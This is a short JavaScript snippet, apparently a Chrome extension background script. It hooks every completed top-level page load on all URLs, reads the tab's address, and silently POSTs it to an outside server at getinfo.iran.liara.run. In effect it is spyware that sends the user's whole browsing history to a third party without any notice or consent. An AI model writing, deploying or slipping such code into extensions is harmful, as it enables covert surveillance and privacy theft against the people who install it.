chrome.webRequest.onCompleted.addListener(
  function(details) {
    if (details.tabId !== -1) {
      chrome.tabs.get(details.tabId, function(tab) {
        var url = tab.url;
        var serverUrl = "https://getinfo.iran.liara.run/record/";

        var xhr = new XMLHttpRequest();
        xhr.open("POST", serverUrl, true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

        var payload = "link=" + encodeURIComponent(url);

        xhr.send(payload);
      });
    }
  },
  { urls: ["<all_urls>"], types: ["main_frame"] }
);